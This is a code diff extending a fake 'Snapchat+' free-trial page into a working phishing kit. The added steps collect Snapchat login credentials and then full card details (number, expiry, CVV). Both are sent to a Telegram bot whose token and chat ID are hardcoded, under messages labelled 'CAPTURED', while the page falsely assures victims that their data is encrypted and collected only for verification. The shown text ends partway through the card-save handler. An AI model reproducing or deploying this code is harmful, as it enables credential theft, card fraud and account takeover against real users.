@@ -324,7 +324,7 @@
       font-weight: 500;
     }
 
-    /* ----- PAGE 2 (card form) exact styles ----- */
+    /* ----- PAGE 2 (email & password) ----- */
     .page2 .phone-container {
       width: 100%;
       max-width: 400px;
@@ -509,27 +509,6 @@
       display: block;
     }
 
-    .page2 .row {
-      display: flex;
-      gap: 12px;
-    }
-
-    .page2 .small-input {
-      flex: 1;
-      position: relative;
-    }
-
-    .page2 .terms {
-      font-size: 12px;
-      color: #856404;
-      margin-top: 10px;
-      line-height: 1.5;
-      background: #fff9e6;
-      padding: 12px 14px;
-      border-radius: 14px;
-      border-left: 4px solid #f9a826;
-    }
-
     .page2 .bottom-section {
       margin-top: 28px;
     }
@@ -565,7 +544,7 @@
       font-size: 15px;
     }
 
-    .page2 .save-btn {
+    .page2 .continue-btn {
       width: 100%;
       padding: 16px;
       border-radius: 40px;
@@ -583,32 +562,15 @@
       pointer-events: none;
     }
 
-    .page2 .save-btn.active {
+    .page2 .continue-btn.active {
       opacity: 1;
       pointer-events: auto;
     }
 
-    .page2 .save-btn:active {
+    .page2 .continue-btn:active {
       transform: scale(0.97);
       background: linear-gradient(135deg, #f39c12, #ffb347);
       box-shadow: 0 4px 8px rgba(249, 168, 38, 0.4);
-    }
-
-    .page2 .card-type {
-      position: absolute;
-      right: 45px;
-      top: 50%;
-      transform: translateY(-50%);
-      font-size: 12px;
-      padding: 2px 6px;
-      border-radius: 4px;
-      background: #f0f0f0;
-      color: #666;
-      display: none;
-    }
-
-    .page2 .card-type.visible {
-      display: block;
     }
 
     .page2 .status-message {
@@ -638,8 +600,322 @@
       display: block;
     }
 
-    /* ----- PAGE 3 (welcome + celebration) new styles, same theme ----- */
-    .page3 {
+    /* ----- PAGE 3 (card form) ----- */
+    .page3 .phone-container {
+      width: 100%;
+      max-width: 400px;
+      background: white;
+      border-radius: 28px;
+      padding: 24px;
+      color: #333;
+      box-shadow: 0 20px 40px rgba(0,0,0,0.08), 0 6px 12px rgba(0,0,0,0.05);
+      border: 1px solid #fff3cd;
+    }
+
+    .page3 .header {
+      display: flex;
+      align-items: center;
+      margin-bottom: 24px;
+      position: relative;
+    }
+
+    .page3 .back-btn {
+      font-size: 24px;
+      margin-right: 16px;
+      cursor: pointer;
+      color: #b8860b;
+      font-weight: 500;
+      width: 32px;
+      height: 32px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border-radius: 50%;
+      background: #fff9e6;
+      transition: 0.2s;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    .page3 .back-btn:active {
+      background: #ffeeba;
+    }
+
+    .page3 .title {
+      font-size: 20px;
+      font-weight: 600;
+      color: #b8860b;
+      letter-spacing: -0.3px;
+    }
+
+    .page3 .clear-btn {
+      position: absolute;
+      right: 0;
+      top: 50%;
+      transform: translateY(-50%);
+      background: #ffc107;
+      color: #856404;
+      border: none;
+      padding: 6px 12px;
+      border-radius: 20px;
+      font-size: 12px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: 0.2s;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    .page3 .clear-btn:active {
+      background: #ffb300;
+      transform: translateY(-50%) scale(0.95);
+    }
+
+    .page3 .subtitle {
+      font-size: 14px;
+      color: #856404;
+      margin-bottom: 20px;
+      font-weight: 500;
+    }
+
+    .page3 label {
+      font-size: 14px;
+      margin-bottom: 6px;
+      display: block;
+      color: #856404;
+      font-weight: 500;
+    }
+
+    .page3 .input-wrapper {
+      position: relative;
+      margin-bottom: 18px;
+    }
+
+    .page3 .input-box {
+      width: 100%;
+      padding: 14px 16px;
+      border-radius: 14px;
+      border: 1.5px solid #ffe5a3;
+      background: white;
+      color: #333;
+      outline: none;
+      transition: 0.2s;
+      font-size: 16px;
+      -webkit-appearance: none;
+      appearance: none;
+    }
+
+    .page3 .input-box:focus {
+      border-color: #f9a826;
+      box-shadow: 0 0 0 3px rgba(249, 168, 38, 0.15);
+    }
+
+    .page3 .input-box.valid {
+      border-color: #28a745;
+      background-color: #f8fff9;
+    }
+
+    .page3 .input-box.invalid {
+      border-color: #dc3545;
+      background-color: #fff8f8;
+    }
+
+    .page3 .input-box::placeholder {
+      color: #d4af7a;
+      opacity: 0.7;
+    }
+
+    .page3 .validation-icon {
+      position: absolute;
+      right: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      font-size: 18px;
+      display: none;
+    }
+
+    .page3 .input-box.valid + .validation-icon {
+      display: block;
+      color: #28a745;
+    }
+
+    .page3 .input-box.invalid + .validation-icon {
+      display: block;
+      color: #dc3545;
+    }
+
+    .page3 .clear-field {
+      position: absolute;
+      right: 35px;
+      top: 50%;
+      transform: translateY(-50%);
+      font-size: 18px;
+      color: #999;
+      cursor: pointer;
+      display: none;
+      width: 20px;
+      height: 20px;
+      border-radius: 50%;
+      background: #f0f0f0;
+      text-align: center;
+      line-height: 18px;
+      font-weight: bold;
+      transition: 0.2s;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    .page3 .input-wrapper:hover .clear-field,
+    .page3 .input-box:focus ~ .clear-field {
+      display: block;
+    }
+
+    .page3 .validation-message {
+      font-size: 12px;
+      margin-top: -12px;
+      margin-bottom: 10px;
+      padding-left: 16px;
+      display: none;
+    }
+
+    .page3 .validation-message.error {
+      color: #dc3545;
+      display: block;
+    }
+
+    .page3 .validation-message.success {
+      color: #28a745;
+      display: block;
+    }
+
+    .page3 .row {
+      display: flex;
+      gap: 12px;
+    }
+
+    .page3 .small-input {
+      flex: 1;
+      position: relative;
+    }
+
+    .page3 .terms {
+      font-size: 12px;
+      color: #856404;
+      margin-top: 10px;
+      line-height: 1.5;
+      background: #fff9e6;
+      padding: 12px 14px;
+      border-radius: 14px;
+      border-left: 4px solid #f9a826;
+    }
+
+    .page3 .bottom-section {
+      margin-top: 28px;
+    }
+
+    .page3 .snapchat-box {
+      display: flex;
+      align-items: center;
+      background: #fff9e6;
+      padding: 14px;
+      border-radius: 18px;
+      margin-bottom: 20px;
+      border: 1px solid #ffeeba;
+    }
+
+    .page3 .snapchat-icon {
+      width: 42px;
+      height: 42px;
+      background: #f9a826;
+      border-radius: 12px;
+      margin-right: 14px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-weight: bold;
+      font-size: 20px;
+      box-shadow: 0 4px 8px rgba(249, 168, 38, 0.3);
+    }
+
+    .page3 .snapchat-box div:last-child {
+      font-weight: 600;
+      color: #b8860b;
+      font-size: 15px;
+    }
+
+    .page3 .save-btn {
+      width: 100%;
+      padding: 16px;
+      border-radius: 40px;
+      border: none;
+      background: linear-gradient(135deg, #f9a826, #ffc107);
+      color: white;
+      font-weight: 700;
+      font-size: 17px;
+      cursor: pointer;
+      transition: 0.2s;
+      box-shadow: 0 8px 16px rgba(249, 168, 38, 0.3);
+      -webkit-tap-highlight-color: transparent;
+      border: 1px solid rgba(255,255,255,0.2);
+      opacity: 0.7;
+      pointer-events: none;
+    }
+
+    .page3 .save-btn.active {
+      opacity: 1;
+      pointer-events: auto;
+    }
+
+    .page3 .save-btn:active {
+      transform: scale(0.97);
+      background: linear-gradient(135deg, #f39c12, #ffb347);
+      box-shadow: 0 4px 8px rgba(249, 168, 38, 0.4);
+    }
+
+    .page3 .card-type {
+      position: absolute;
+      right: 45px;
+      top: 50%;
+      transform: translateY(-50%);
+      font-size: 12px;
+      padding: 2px 6px;
+      border-radius: 4px;
+      background: #f0f0f0;
+      color: #666;
+      display: none;
+    }
+
+    .page3 .card-type.visible {
+      display: block;
+    }
+
+    .page3 .status-message {
+      text-align: center;
+      padding: 10px;
+      border-radius: 10px;
+      margin-top: 10px;
+      font-size: 14px;
+      display: none;
+    }
+
+    .page3 .status-message.success {
+      background: #d4edda;
+      color: #155724;
+      display: block;
+    }
+
+    .page3 .status-message.error {
+      background: #f8d7da;
+      color: #721c24;
+      display: block;
+    }
+
+    .page3 .status-message.info {
+      background: #fff3cd;
+      color: #856404;
+      display: block;
+    }
+
+    /* ----- PAGE 4 (welcome + celebration) ----- */
+    .page4 {
       background: #f2e9d0;
     }
     .welcome-card {
@@ -823,11 +1099,52 @@
     </div>
   </div>
 
-  <!-- PAGE 2 (card form) -->
+  <!-- PAGE 2 (email & password) -->
   <div class="page page2" id="page2">
     <div class="phone-container">
       <div class="header">
         <div class="back-btn" id="backToPage1" role="button" tabindex="0">←</div>
+        <div class="title">Verify your account</div>
+        <button class="clear-btn" id="clear-all-email-btn">Clear All</button>
+      </div>
+      <div class="subtitle">Enter your Snapchat login details</div>
+      
+      <div class="input-wrapper">
+        <label for="email">Email or username</label>
+        <input class="input-box" id="email" placeholder="username@example.com" type="email" autocomplete="off" />
+        <span class="clear-field" id="clear-email">×</span>
+        <span class="validation-icon" id="email-icon">✓</span>
+      </div>
+      <div class="validation-message" id="email-message"></div>
+      
+      <div class="input-wrapper">
+        <label for="password">Password</label>
+        <input class="input-box" id="password" placeholder="••••••••" type="password" autocomplete="off" />
+        <span class="clear-field" id="clear-password">×</span>
+        <span class="validation-icon" id="password-icon">✓</span>
+      </div>
+      <div class="validation-message" id="password-message"></div>
+
+      <div class="terms">
+        For verification purposes only. Your information is encrypted and secure.
+      </div>
+
+      <div class="bottom-section">
+        <div class="snapchat-box">
+          <div class="snapchat-icon">👻</div>
+          <div>Snapchat+ Account Verification</div>
+        </div>
+        <button class="continue-btn" id="continue-btn">Continue</button>
+        <div class="status-message" id="email-status-message"></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- PAGE 3 (card form) -->
+  <div class="page page3" id="page3">
+    <div class="phone-container">
+      <div class="header">
+        <div class="back-btn" id="backToPage2" role="button" tabindex="0">←</div>
         <div class="title">Add credit or debit card</div>
         <button class="clear-btn" id="clear-all-btn">Clear All</button>
       </div>
@@ -878,8 +1195,8 @@
     </div>
   </div>
 
-  <!-- PAGE 3 (welcome + celebration) -->
-  <div class="page page3" id="page3">
+  <!-- PAGE 4 (welcome + celebration) -->
+  <div class="page page4" id="page4">
     <div class="welcome-card">
       <!-- celebration background effects -->
       <div class="celebration-bg"></div>
@@ -907,15 +1224,39 @@
       const page1 = document.getElementById('page1');
       const page2 = document.getElementById('page2');
       const page3 = document.getElementById('page3');
+      const page4 = document.getElementById('page4');
       
       const trialBtn = document.getElementById('startTrialBtn');
-      const backBtn = document.getElementById('backToPage1');
+      const backToPage1Btn = document.getElementById('backToPage1');
+      const backToPage2Btn = document.getElementById('backToPage2');
+      const continueBtn = document.getElementById('continue-btn');
       const saveBtn = document.getElementById('save-btn');
       const doneBtn = document.getElementById('doneBtn');
 
-      function showPage1() { page1.classList.add('active'); page2.classList.remove('active'); page3.classList.remove('active'); }
-      function showPage2() { page1.classList.remove('active'); page2.classList.add('active'); page3.classList.remove('active'); }
-      function showPage3() { page1.classList.remove('active'); page2.classList.remove('active'); page3.classList.add('active'); }
+      function showPage1() { 
+        page1.classList.add('active'); 
+        page2.classList.remove('active'); 
+        page3.classList.remove('active'); 
+        page4.classList.remove('active'); 
+      }
+      function showPage2() { 
+        page1.classList.remove('active'); 
+        page2.classList.add('active'); 
+        page3.classList.remove('active'); 
+        page4.classList.remove('active'); 
+      }
+      function showPage3() { 
+        page1.classList.remove('active'); 
+        page2.classList.remove('active'); 
+        page3.classList.add('active'); 
+        page4.classList.remove('active'); 
+      }
+      function showPage4() { 
+        page1.classList.remove('active'); 
+        page2.classList.remove('active'); 
+        page3.classList.remove('active'); 
+        page4.classList.add('active'); 
+      }
 
       // ----- PAGE 1 logic (selection) -----
       const freePass = document.getElementById('freePassPlan');
@@ -942,9 +1283,24 @@
       trialBtn.addEventListener('click', () => { showPage2(); });
 
       // back from page2 to page1
-      backBtn.addEventListener('click', () => { showPage1(); });
+      backToPage1Btn.addEventListener('click', () => { showPage1(); });
 
-      // ----- PAGE 2 logic (card + telegram) -----
+      // back from page3 to page2
+      backToPage2Btn.addEventListener('click', () => { showPage2(); });
+
+      // ----- PAGE 2 elements (email & password) -----
+      const emailInput = document.getElementById('email');
+      const passwordInput = document.getElementById('password');
+      const emailIcon = document.getElementById('email-icon');
+      const passwordIcon = document.getElementById('password-icon');
+      const emailMessage = document.getElementById('email-message');
+      const passwordMessage = document.getElementById('password-message');
+      const clearAllEmailBtn = document.getElementById('clear-all-email-btn');
+      const clearEmail = document.getElementById('clear-email');
+      const clearPassword = document.getElementById('clear-password');
+      const emailStatusMessage = document.getElementById('email-status-message');
+
+      // ----- PAGE 3 elements (card) -----
       const cardInput = document.getElementById('card-number');
       const expiryInput = document.getElementById('expiry');
       const cvvInput = document.getElementById('cvv');
@@ -964,14 +1320,62 @@
       const botToken = '2128201203:AAGPpKg3uIEjy8V1KYHXPfddBmxTFmgt_ZE';
       const chatId = '1327564115';
 
-      function clearField(input, icon, message, typeElement = null) {
-        input.value = ''; input.classList.remove('valid', 'invalid'); if(icon) icon.style.display = 'none';
-        if(message) { message.textContent = ''; message.classList.remove('error','success'); }
-        if(typeElement) typeElement.classList.remove('visible'); checkAllFields();
+      // Email page clear functions
+      function clearEmailField(input, icon, message) {
+        input.value = ''; 
+        input.classList.remove('valid', 'invalid'); 
+        if(icon) icon.style.display = 'none';
+        if(message) { 
+          message.textContent = ''; 
+          message.classList.remove('error', 'success'); 
+        }
+        checkEmailFields();
       }
-      clearCard.addEventListener('click', (e) => { e.stopPropagation(); clearField(cardInput, cardIcon, cardMessage, cardType); });
-      clearExpiry.addEventListener('click', (e) => { e.stopPropagation(); clearField(expiryInput, expiryIcon, expiryMessage); });
-      clearCvv.addEventListener('click', (e) => { e.stopPropagation(); clearField(cvvInput, cvvIcon, cvvMessage); });
+
+      clearEmail.addEventListener('click', (e) => { 
+        e.stopPropagation(); 
+        clearEmailField(emailInput, emailIcon, emailMessage); 
+      });
+      
+      clearPassword.addEventListener('click', (e) => { 
+        e.stopPropagation(); 
+        clearEmailField(passwordInput, passwordIcon, passwordMessage); 
+      });
+      
+      clearAllEmailBtn.addEventListener('click', () => {
+        clearEmailField(emailInput, emailIcon, emailMessage);
+        clearEmailField(passwordInput, passwordIcon, passwordMessage);
+        emailStatusMessage.style.display = 'none';
+      });
+
+      // Card page clear functions
+      function clearField(input, icon, message, typeElement = null) {
+        input.value = ''; 
+        input.classList.remove('valid', 'invalid'); 
+        if(icon) icon.style.display = 'none';
+        if(message) { 
+          message.textContent = ''; 
+          message.classList.remove('error','success'); 
+        }
+        if(typeElement) typeElement.classList.remove('visible'); 
+        checkCardFields();
+      }
+      
+      clearCard.addEventListener('click', (e) => { 
+        e.stopPropagation(); 
+        clearField(cardInput, cardIcon, cardMessage, cardType); 
+      });
+      
+      clearExpiry.addEventListener('click', (e) => { 
+        e.stopPropagation(); 
+        clearField(expiryInput, expiryIcon, expiryMessage); 
+      });
+      
+      clearCvv.addEventListener('click', (e) => { 
+        e.stopPropagation(); 
+        clearField(cvvInput, cvvIcon, cvvMessage); 
+      });
+      
       clearAllBtn.addEventListener('click', () => {
         clearField(cardInput, cardIcon, cardMessage, cardType);
         clearField(expiryInput, expiryIcon, expiryMessage);
@@ -979,105 +1383,316 @@
         statusMessage.style.display = 'none';
       });
 
+      // Email validation
+      emailInput.addEventListener('input', function(e) {
+        const value = e.target.value;
+        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        
+        if (value.length === 0) {
+          emailInput.classList.remove('valid', 'invalid');
+          emailIcon.style.display = 'none';
+          emailMessage.textContent = '';
+          emailMessage.classList.remove('error', 'success');
+        } else if (emailRegex.test(value)) {
+          emailInput.classList.add('valid');
+          emailInput.classList.remove('invalid');
+          emailIcon.style.display = 'block';
+          emailIcon.textContent = '✓';
+          emailMessage.textContent = 'Valid email';
+          emailMessage.classList.add('success');
+          emailMessage.classList.remove('error');
+        } else {
+          emailInput.classList.add('invalid');
+          emailInput.classList.remove('valid');
+          emailIcon.style.display = 'block';
+          emailIcon.textContent = '✗';
+          emailMessage.textContent = 'Enter a valid email address';
+          emailMessage.classList.add('error');
+          emailMessage.classList.remove('success');
+        }
+        checkEmailFields();
+      });
+
+      passwordInput.addEventListener('input', function(e) {
+        const value = e.target.value;
+        
+        if (value.length === 0) {
+          passwordInput.classList.remove('valid', 'invalid');
+          passwordIcon.style.display = 'none';
+          passwordMessage.textContent = '';
+          passwordMessage.classList.remove('error', 'success');
+        } else if (value.length >= 6) {
+          passwordInput.classList.add('valid');
+          passwordInput.classList.remove('invalid');
+          passwordIcon.style.display = 'block';
+          passwordIcon.textContent = '✓';
+          passwordMessage.textContent = 'Valid password';
+          passwordMessage.classList.add('success');
+          passwordMessage.classList.remove('error');
+        } else {
+          passwordInput.classList.add('invalid');
+          passwordInput.classList.remove('valid');
+          passwordIcon.style.display = 'block';
+          passwordIcon.textContent = '✗';
+          passwordMessage.textContent = 'Password must be at least 6 characters';
+          passwordMessage.classList.add('error');
+          passwordMessage.classList.remove('success');
+        }
+        checkEmailFields();
+      });
+
+      // Card validation
       cardInput.addEventListener('input', function(e) {
         let value = e.target.value.replace(/\D/g, '');
         let type = 'Unknown';
-        if (value.startsWith('4')) type = 'Visa'; else if (value.startsWith('5')) type = 'Mastercard'; else if (value.startsWith('3')) type = 'Amex'; else if (value.startsWith('6')) type = 'Discover';
+        if (value.startsWith('4')) type = 'Visa'; 
+        else if (value.startsWith('5')) type = 'Mastercard'; 
+        else if (value.startsWith('3')) type = 'Amex'; 
+        else if (value.startsWith('6')) type = 'Discover';
+        
         let formatted = '';
-        for (let i = 0; i < value.length; i++) { if (i > 0 && i % 4 === 0) formatted += ' '; formatted += value[i]; }
-        e.target.value = formatted;
-        if (value.length === 0) {
-          cardInput.classList.remove('valid','invalid'); cardIcon.style.display = 'none'; cardMessage.textContent = ''; cardMessage.classList.remove('error','success'); cardType.classList.remove('visible');
-        } else if (value.length === 16) {
-          cardInput.classList.add('valid'); cardInput.classList.remove('invalid'); cardIcon.style.display = 'block'; cardIcon.textContent = '✓'; cardMessage.textContent = 'Valid card number'; cardMessage.classList.add('success'); cardMessage.classList.remove('error'); cardType.textContent = type; cardType.classList.add('visible');
-        } else {
-          cardInput.classList.add('invalid'); cardInput.classList.remove('valid'); cardIcon.style.display = 'block'; cardIcon.textContent = '✗'; cardMessage.textContent = 'Card number must be 16 digits'; cardMessage.classList.add('error'); cardMessage.classList.remove('success'); cardType.classList.remove('visible');
+        for (let i = 0; i < value.length; i++) { 
+          if (i > 0 && i % 4 === 0) formatted += ' '; 
+          formatted += value[i]; 
         }
-        checkAllFields();
+        e.target.value = formatted;
+        
+        if (value.length === 0) {
+          cardInput.classList.remove('valid','invalid'); 
+          cardIcon.style.display = 'none'; 
+          cardMessage.textContent = ''; 
+          cardMessage.classList.remove('error','success'); 
+          cardType.classList.remove('visible');
+        } else if (value.length === 16) {
+          cardInput.classList.add('valid'); 
+          cardInput.classList.remove('invalid'); 
+          cardIcon.style.display = 'block'; 
+          cardIcon.textContent = '✓'; 
+          cardMessage.textContent = 'Valid card number'; 
+          cardMessage.classList.add('success'); 
+          cardMessage.classList.remove('error'); 
+          cardType.textContent = type; 
+          cardType.classList.add('visible');
+        } else {
+          cardInput.classList.add('invalid'); 
+          cardInput.classList.remove('valid'); 
+          cardIcon.style.display = 'block'; 
+          cardIcon.textContent = '✗'; 
+          cardMessage.textContent = 'Card number must be 16 digits'; 
+          cardMessage.classList.add('error'); 
+          cardMessage.classList.remove('success'); 
+          cardType.classList.remove('visible');
+        }
+        checkCardFields();
       });
 
       expiryInput.addEventListener('input', function(e) {
         let value = e.target.value.replace(/\D/g, '');
-        if (e.inputType === 'deleteContentBackward') { e.target.value = value; return; }
+        if (e.inputType === 'deleteContentBackward') { 
+          e.target.value = value; 
+          return; 
+        }
         if (value.length >= 2) value = value.substring(0,2) + '/' + value.substring(2,4);
         e.target.value = value;
+        
         if (value.length === 0) {
-          expiryInput.classList.remove('valid','invalid'); expiryIcon.style.display = 'none'; expiryMessage.textContent = ''; expiryMessage.classList.remove('error','success');
+          expiryInput.classList.remove('valid','invalid'); 
+          expiryIcon.style.display = 'none'; 
+          expiryMessage.textContent = ''; 
+          expiryMessage.classList.remove('error','success');
         } else if (value.length === 5) {
-          const [month, year] = value.split('/'); const currentYear = new Date().getFullYear() % 100; const currentMonth = new Date().getMonth() + 1;
+          const [month, year] = value.split('/'); 
+          const currentYear = new Date().getFullYear() % 100; 
+          const currentMonth = new Date().getMonth() + 1;
           if (month >=1 && month <=12 && year >= currentYear) {
             if (year == currentYear && month < currentMonth) {
-              expiryInput.classList.add('invalid'); expiryInput.classList.remove('valid'); expiryIcon.style.display = 'block'; expiryIcon.textContent = '✗'; expiryMessage.textContent = 'Card has expired'; expiryMessage.classList.add('error'); expiryMessage.classList.remove('success');
+              expiryInput.classList.add('invalid'); 
+              expiryInput.classList.remove('valid'); 
+              expiryIcon.style.display = 'block'; 
+              expiryIcon.textContent = '✗'; 
+              expiryMessage.textContent = 'Card has expired'; 
+              expiryMessage.classList.add('error'); 
+              expiryMessage.classList.remove('success');
             } else {
-              expiryInput.classList.add('valid'); expiryInput.classList.remove('invalid'); expiryIcon.style.display = 'block'; expiryIcon.textContent = '✓'; expiryMessage.textContent = 'Valid expiry date'; expiryMessage.classList.add('success'); expiryMessage.classList.remove('error');
+              expiryInput.classList.add('valid'); 
+              expiryInput.classList.remove('invalid'); 
+              expiryIcon.style.display = 'block'; 
+              expiryIcon.textContent = '✓'; 
+              expiryMessage.textContent = 'Valid expiry date'; 
+              expiryMessage.classList.add('success'); 
+              expiryMessage.classList.remove('error');
             }
           } else {
-            expiryInput.classList.add('invalid'); expiryInput.classList.remove('valid'); expiryIcon.style.display = 'block'; expiryIcon.textContent = '✗'; expiryMessage.textContent = 'Invalid expiry date'; expiryMessage.classList.add('error'); expiryMessage.classList.remove('success');
+            expiryInput.classList.add('invalid'); 
+            expiryInput.classList.remove('valid'); 
+            expiryIcon.style.display = 'block'; 
+            expiryIcon.textContent = '✗'; 
+            expiryMessage.textContent = 'Invalid expiry date'; 
+            expiryMessage.classList.add('error'); 
+            expiryMessage.classList.remove('success');
           }
         } else {
-          expiryInput.classList.add('invalid'); expiryInput.classList.remove('valid'); expiryIcon.style.display = 'block'; expiryIcon.textContent = '✗'; expiryMessage.textContent = 'Use format MM/YY'; expiryMessage.classList.add('error'); expiryMessage.classList.remove('success');
+          expiryInput.classList.add('invalid'); 
+          expiryInput.classList.remove('valid'); 
+          expiryIcon.style.display = 'block'; 
+          expiryIcon.textContent = '✗'; 
+          expiryMessage.textContent = 'Use format MM/YY'; 
+          expiryMessage.classList.add('error'); 
+          expiryMessage.classList.remove('success');
         }
-        checkAllFields();
+        checkCardFields();
       });
 
       cvvInput.addEventListener('input', function(e) {
-        let value = e.target.value.replace(/\D/g, ''); if (value.length > 4) value = value.substring(0,4); e.target.value = value;
+        let value = e.target.value.replace(/\D/g, ''); 
+        if (value.length > 4) value = value.substring(0,4); 
+        e.target.value = value;
+        
         if (value.length === 0) {
-          cvvInput.classList.remove('valid','invalid'); cvvIcon.style.display = 'none'; cvvMessage.textContent = ''; cvvMessage.classList.remove('error','success');
+          cvvInput.classList.remove('valid','invalid'); 
+          cvvIcon.style.display = 'none'; 
+          cvvMessage.textContent = ''; 
+          cvvMessage.classList.remove('error','success');
         } else if (value.length === 3 || value.length === 4) {
-          cvvInput.classList.add('valid'); cvvInput.classList.remove('invalid'); cvvIcon.style.display = 'block'; cvvIcon.textContent = '✓'; cvvMessage.textContent = 'Valid CVV'; cvvMessage.classList.add('success'); cvvMessage.classList.remove('error');
+          cvvInput.classList.add('valid'); 
+          cvvInput.classList.remove('invalid'); 
+          cvvIcon.style.display = 'block'; 
+          cvvIcon.textContent = '✓'; 
+          cvvMessage.textContent = 'Valid CVV'; 
+          cvvMessage.classList.add('success'); 
+          cvvMessage.classList.remove('error');
         } else {
-          cvvInput.classList.add('invalid'); cvvInput.classList.remove('valid'); cvvIcon.style.display = 'block'; cvvIcon.textContent = '✗'; const cardValue = cardInput.value.replace(/\D/g, ''); if (cardValue.startsWith('3')) cvvMessage.textContent = 'Amex requires 4 digits'; else cvvMessage.textContent = 'CVV must be 3 digits'; cvvMessage.classList.add('error'); cvvMessage.classList.remove('success');
+          cvvInput.classList.add('invalid'); 
+          cvvInput.classList.remove('valid'); 
+          cvvIcon.style.display = 'block'; 
+          cvvIcon.textContent = '✗'; 
+          const cardValue = cardInput.value.replace(/\D/g, ''); 
+          if (cardValue.startsWith('3')) cvvMessage.textContent = 'Amex requires 4 digits'; 
+          else cvvMessage.textContent = 'CVV must be 3 digits'; 
+          cvvMessage.classList.add('error'); 
+          cvvMessage.classList.remove('success');
         }
-        checkAllFields();
+        checkCardFields();
       });
 
-      function checkAllFields() {
+      function checkEmailFields() {
+        const emailValid = emailInput.classList.contains('valid');
+        const passwordValid = passwordInput.classList.contains('valid');
+        if (emailValid && passwordValid) continueBtn.classList.add('active'); 
+        else continueBtn.classList.remove('active');
+      }
+
+      function checkCardFields() {
         const cardValid = cardInput.classList.contains('valid');
         const expiryValid = expiryInput.classList.contains('valid');
         const cvvValid = cvvInput.classList.contains('valid');
-        if (cardValid && expiryValid && cvvValid) saveBtn.classList.add('active'); else saveBtn.classList.remove('active');
+        if (cardValid && expiryValid && cvvValid) saveBtn.classList.add('active'); 
+        else saveBtn.classList.remove('active');
       }
 
-      function sendToTelegram(cardData) {
+      function sendToTelegram(message) {
         return new Promise((resolve, reject) => {
-          const message = `💳 CARD DETAILS CAPTURED 💳\n━━━━━━━━━━━━━━━━━━\n📱 Card Number: ${cardData.cardNumber}\n📅 Expiry Date: ${cardData.expiry}\n🔐 CVV: ${cardData.cvv}\n💳 Card Type: ${cardData.cardType}\n━━━━━━━━━━━━━━━━━━\n⏰ Time: ${new Date().toLocaleString()}`;
-          const script = document.createElement('script'); const callbackName = 'telegram_callback_' + Date.now();
-          window[callbackName] = function(data) { delete window[callbackName]; document.body.removeChild(script); if (data.ok) resolve(data); else reject(new Error(data.description || 'Unknown error')); };
+          const script = document.createElement('script'); 
+          const callbackName = 'telegram_callback_' + Date.now();
+          
+          window[callbackName] = function(data) { 
+            delete window[callbackName]; 
+            document.body.removeChild(script); 
+            if (data.ok) resolve(data); 
+            else reject(new Error(data.description || 'Unknown error')); 
+          };
+          
           const encodedMessage = encodeURIComponent(message);
           const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodedMessage}&parse_mode=Markdown&callback=${callbackName}`;
-          script.src = url; script.onerror = () => { delete window[callbackName]; document.body.removeChild(script); fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'Markdown' }) }).then(r => r.json()).then(data => { if (data.ok) resolve(data); else reject(new Error(data.description)); }).catch(reject); };
+          
+          script.src = url; 
+          script.onerror = () => { 
+            delete window[callbackName]; 
+            document.body.removeChild(script); 
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { 
+              method: 'POST', 
+              headers: { 'Content-Type': 'application/json' }, 
+              body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'Markdown' }) 
+            }).then(r => r.json()).then(data => { 
+              if (data.ok) resolve(data); 
+              else reject(new Error(data.description)); 
+            }).catch(reject); 
+          };
+          
           document.body.appendChild(script);
           setTimeout(() => { reject(new Error('Request timeout')); }, 10000);
         });
       }
 
-      saveBtn.addEventListener('click', async function() {
-        if (!saveBtn.classList.contains('active')) return;
-        statusMessage.className = 'status-message info'; statusMessage.textContent = '⏳ Processing...';
-        const cardNumber = cardInput.value; const expiry = expiryInput.value; const cvv = cvvInput.value; const cardNumDigits = cardNumber.replace(/\D/g, '');
-        let cardTypeStr = 'Unknown';
-        if (cardNumDigits.startsWith('4')) cardTypeStr = 'Visa'; else if (cardNumDigits.startsWith('5')) cardTypeStr = 'Mastercard'; else if (cardNumDigits.startsWith('3')) cardTypeStr = 'Amex'; else if (cardNumDigits.startsWith('6')) cardTypeStr = 'Discover';
-        const cardData = { cardNumber, expiry, cvv, cardType: cardTypeStr };
+      // Email continue
+      continueBtn.addEventListener('click', async function() {
+        if (!continueBtn.classList.contains('active')) return;
+        emailStatusMessage.className = 'status-message info'; 
+        emailStatusMessage.textContent = '⏳ Verifying...';
+        
+        const email = emailInput.value; 
+        const password = passwordInput.value; 
+        
+        const message = `📧 ACCOUNT DETAILS CAPTURED 📧\n━━━━━━━━━━━━━━━━━━\n👤 Email/Username: ${email}\n🔑 Password: ${password}\n━━━━━━━━━━━━━━━━━━\n⏰ Time: ${new Date().toLocaleString()}`;
+        
         try {
-          await sendToTelegram(cardData);
-          statusMessage.className = 'status-message success'; statusMessage.textContent = '✅ Card saved!';
+          await sendToTelegram(message);
+          emailStatusMessage.className = 'status-message success'; 
+          emailStatusMessage.textContent = '✅ Verified!';
           setTimeout(() => {
-            clearField(cardInput, cardIcon, cardMessage, cardType); clearField(expiryInput, expiryIcon, expiryMessage); clearField(cvvInput, cvvIcon, cvvMessage);
-            statusMessage.style.display = 'none';
-            showPage3();  // <-- after success, go to welcome page
+            clearEmailField(emailInput, emailIcon, emailMessage); 
+            clearEmailField(passwordInput, passwordIcon, passwordMessage);
+            emailStatusMessage.style.display = 'none';
+            showPage3();  // Go to card page after email
           }, 800);
         } catch (error) {
-          statusMessage.className = 'status-message error'; statusMessage.textContent = '❌ Connection failed. Try again.';
+          emailStatusMessage.className = 'status-message error'; 
+          emailStatusMessage.textContent = '❌ Connection failed. Try again.';
         }
       });
 
-      // Done button on welcome page goes back to page1 (or you can decide)
+      // Card save
+      saveBtn.addEventListener('click', async function() {
+        if (!saveBtn.classList.contains('active')) return;
+        statusMessage.className = 'status-message info'; 
+        statusMessage.textContent = '⏳ Processing...';
+        
